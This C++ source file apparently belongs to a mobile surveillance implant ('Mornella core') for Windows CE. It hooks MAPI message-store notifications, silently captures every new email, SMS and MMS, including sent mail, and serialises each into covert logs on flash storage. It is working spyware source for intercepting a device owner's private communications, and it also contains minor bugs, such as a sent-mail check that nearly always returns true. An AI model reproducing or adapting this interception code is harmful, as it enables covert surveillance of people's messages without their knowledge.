#include "MAPIAdviseSink.h"
#include "MAPIMessage.h"

#include <memory>

// Includes from Mornella core
#include "Common.h"
#include "Log.h"

#include <cemapi.h>

#define INITGUID
#define USES_IID_IMAPIAdviseSink
#include <initguid.h>
#include <mapiguid.h>

BOOL isSentMailBox(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID);
LPWSTR getFolderName(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID);
LPMESSAGE openMessage(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID);

CMAPIAdviseSink::CMAPIAdviseSink(IMAPISession& session)
: m_pStore(NULL), _session(session)
{
}

CMAPIAdviseSink::~CMAPIAdviseSink(void)
{
  if (m_pStore)
    m_pStore->Release();
}

// IMAPIAdviseSink's IUnknown interface
STDMETHODIMP CMAPIAdviseSink::QueryInterface(REFIID riid, LPVOID *ppv) {
	if(IsEqualIID(riid, IID_IUnknown) || IsEqualIID(riid, IID_IMAPIAdviseSink)){
			 *ppv = (IMAPIAdviseSink *)this;
			 AddRef();
			 return NO_ERROR;
	 }
	 *ppv = NULL;
	 
	 return E_NOINTERFACE;
}

STDMETHODIMP_(ULONG) CMAPIAdviseSink::AddRef() {
	return (ULONG)InterlockedIncrement(&m_lRef);
}

STDMETHODIMP_(ULONG) CMAPIAdviseSink::Release() {
	ULONG ulCount = (ULONG)InterlockedDecrement(&m_lRef);
	if(ulCount == 0)
		delete this;
	return ulCount;
}

STDMETHODIMP_(ULONG) CMAPIAdviseSink::OnNotify(ULONG cNotif, LPNOTIFICATION lpNotifications)
{
	(void) cNotif;
	ULONG notification_type = lpNotifications->ulEventType;

	// log only messages created or moved
	if (notification_type != fnevObjectCreated && notification_type != fnevObjectMoved ) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [uninteresting notification] ", 5, FALSE);
		return S_OK;
	}
	
	DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [notification] ", 5, FALSE);
	
	if ( lpNotifications->info.obj.ulObjType != MAPI_MESSAGE ) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [not for a message, ignoring] ", 5, FALSE);
		return S_OK;
	}
	
#if DEBUG
	if (notification_type == fnevObjectCreated) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [new message] ", 5, FALSE);
	} else {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [moved message] ", 5, FALSE);
	}
#endif
	
	OBJECT_NOTIFICATION* obj = &lpNotifications->info.obj;
	HRESULT hRes = E_FAIL;
	
	/* open the message */
	LPMESSAGE lpMsg = openMessage( m_pStore, obj->cbEntryID, obj->lpEntryID);
	if (lpMsg == NULL) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR cannot open message]", 5, FALSE);
		return S_OK;
	}
	
	std::auto_ptr<MAPIMessage> message;
	message.reset(new MAPIMessage(lpMsg));
	
	/* set folder */
	LPWSTR folderName = getFolderName(m_pStore, obj->cbParentID, obj->lpParentID);
	message->SetFolder( folderName );
	
	/* parse the message*/
	if ( FAILED( message->Parse(REALTIME) ) ) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR parsing message]", 5, FALSE);
		return S_OK;
	}
	
#if DEBUG
	if (message->isMail()) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [Mail message]", 5, FALSE);
	} else if (message->isSMS()) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [SMS message]", 5, FALSE);
	} else if (message->isMMS()) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [MMS message]", 5, FALSE);
	}
#endif
	
	if ( message->isMail() ) {
		/* if this is a MAIL message, it MUST have a body */	
		if ( ! message->hasBody() ) {
			DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR does not have a body]", 5, FALSE);
			return S_OK;
		}
		
		/* me get moved mail only if we are in Sent Mail box */
		if ( notification_type == fnevObjectMoved ) {
			if ( ! isSentMailBox(m_pStore, obj->cbParentID, obj->lpParentID) ) {
				DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR folder is not Sent Mail]", 5, FALSE);
				return S_OK;
			}
		}
	} else if ( message->isSMS() ) {
		/* we get SMSs only upon creation */
		if (notification_type != fnevObjectCreated && notification_type != fnevObjectMoved) {
			DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR SMS moved, ignoring]", 5, FALSE);
			return S_OK;
		}

		/* check if SMS data is consistent */
		if (message->From() == message->To()) {
			DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR message from local to local, ignoring]", 5, FALSE);
			return S_OK;
		}
	}
	
	if ( ! LogMessage(*message) ) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR message not logged]", 5, FALSE);
		return S_OK;
	}
	
	DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [message logged!]", 5, FALSE);

	return S_OK;
}

BOOL CMAPIAdviseSink::LogMessage( MAPIMessage& message )
{
	HRESULT hRes = E_FAIL;
	
	DWORD cbSize;
	std::auto_ptr<BYTE> lpData;
	lpData.reset( message.Serialize(&cbSize) );
	if (lpData.get() == NULL) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR serializing message]", 5, FALSE);
		return FALSE;
	}
	
	Log pLog;
	UINT log_type = LOGTYPE_MAIL;
	
	if (CmpWildW(CLASS_MAIL, message.Class()) != 0)
		log_type = LOGTYPE_MAIL;
	else if (CmpWildW(CLASS_SMS, message.Class()) != 0)
		log_type = LOGTYPE_SMS;
	else if (CmpWildW(CLASS_MMS, message.Class()) != 0)
		log_type = LOGTYPE_MMS;
	
	if (pLog.CreateLog(log_type, NULL, 0, FLASH) != TRUE) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR cannot create log]", 5, FALSE);
		return FALSE;
	}
	
	pLog.WriteLog(lpData.get(), cbSize);
	pLog.CloseLog();
	
	DBG_TRACE_INT(L"Debug - MAPIAdviseSink.cpp - OnNotify() [serialized message] size: ", 5, FALSE, cbSize);
	
	return TRUE;
}

bool CMAPIAdviseSink::_GetIgnoredFolders()
{
  LPSPropValue rgprops = NULL;
  // LPSPropValue lppPropArray = NULL;
  ULONG cValues = 0;
  // IMAPIFolder *pPOPInboxFolder = NULL;
  
  SizedSPropTagArray(1, rgFolderTags) = {1, { /* PR_IPM_OUTBOX_ENTRYID, */ PR_CE_IPM_DRAFTS_ENTRYID, } };
  
  HRESULT hr = m_pStore->GetProps((LPSPropTagArray)&rgFolderTags, MAPI_UNICODE, &cValues, &rgprops);
  if(FAILED(hr))
    return false;
  
  for (ULONG i = 0; i < 1; i++)
  {
    ULONG cbEntryID = rgprops[i].Value.bin.cb;
    LPENTRYID lpEntryID = (LPENTRYID)rgprops[i].Value.bin.lpb;
    
    rawEntryID* reID = new rawEntryID;
    reID->cbSize = cbEntryID;
    reID->lpEntryID = (LPBYTE)lpEntryID;
    
    //_ignoredFolders.push_back(reID);
    
    IMAPIFolder* pFolder = NULL;
    hr = m_pStore->OpenEntry(
      cbEntryID,
      lpEntryID,
      NULL, 
      MAPI_MODIFY,
      NULL, 
      (LPUNKNOWN*)&pFolder);
	if (!pFolder) {
		MAPIFreeBuffer(rgprops);
		return false;
	}

    SizedSPropTagArray(1, ptaFolder) = {1, {PR_DISPLAY_NAME}};
    LPSPropValue rgFolderProps = NULL;
    pFolder->GetProps((LPSPropTagArray)&ptaFolder, MAPI_UNICODE, &cValues, &rgFolderProps);
    LPWSTR lpFolderName = rgFolderProps[0].Value.lpszW;
    
  }
  
  MAPIFreeBuffer(rgprops);
  
  return true;
}

bool CMAPIAdviseSink::_IsIgnoredFolder( ULONG cbEntryId, LPBYTE lpEntryID )
{
  for (std::list<rawEntryID*>::iterator i = _ignoredFolders.begin(); i != _ignoredFolders.end(); i++)
  {
    rawEntryID* reID = *i;
    
    if (cbEntryId == reID->cbSize)
    {
      int eq = memcmp(lpEntryID, reID->lpEntryID, cbEntryId);
      if (eq == 0)
        return true;
    }
  }
  
  return false;
}

void CMAPIAdviseSink::Unadvise()
{
	m_pStore->Unadvise(m_ulConnectionNumber);
}

BOOL isSentMailBox(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID) 
{
	HRESULT hRes = E_FAIL;
	ULONG rgTags[] = { 1, PR_IPM_SENTMAIL_ENTRYID};
	LPSPropValue rgStoreProps = NULL;
	ULONG cValues = 0;
	hRes = pStore->GetProps((LPSPropTagArray) rgTags, MAPI_UNICODE, &cValues, &rgStoreProps);
	if (FAILED(hRes)) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - isSentMailBox() [cannot determine, assuming it is]", 5, FALSE);
		return TRUE;
	}

	if(rgStoreProps[0].ulPropTag == PR_IPM_SENTMAIL_ENTRYID) {
		return TRUE;
	}

	return FALSE;
}

LPWSTR getFolderName(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID) 
{
	
	HRESULT hRes = E_FAIL;
	ULONG ulObjType = MAPI_FOLDER;
	LPMAPIFOLDER lpFolder = NULL;
	
	// Get parent folder
	hRes = pStore->OpenEntry(cbEntryID, lpEntryID, 0, 0, &ulObjType, (LPUNKNOWN*)&lpFolder);
	if (hRes != S_OK) {
		return NULL;
	}
	
	SizedSPropTagArray(2, ptaFolder) = {2, {PR_DISPLAY_NAME, PR_ENTRYID}};
	LPSPropValue rgFolderProps = NULL;
	ULONG cValues = 0;
	
	// Get parent folder properties
	hRes = lpFolder->GetProps((LPSPropTagArray)&ptaFolder, MAPI_UNICODE, &cValues, &rgFolderProps);
	if (hRes != S_OK) {
		lpFolder->Release();
		return NULL;
	}
	
	// folder name
	return rgFolderProps[0].Value.lpszW;
}

LPMESSAGE openMessage(IMsgStore* pStore, ULONG cbEntryID, LPENTRYID lpEntryID)
{
	// Open message
	LPMESSAGE lpMessage = NULL;
	HRESULT hRes = pStore->OpenEntry(cbEntryID, 
		lpEntryID, 
		NULL, 
		0, 
		NULL, 
		(LPUNKNOWN *)&lpMessage);
	if (hRes != S_OK) {
		switch (hRes) {
		  case MAPI_E_NOT_FOUND:
			  DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - openMessage() [ERROR message not found]", 5, FALSE);
			  return NULL;
			  break;
		  default:
			  DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - openMessage() [ERROR generic while opening] ", 5, FALSE);
			  return NULL;
			  break;
		}
	}

	return lpMessage;
}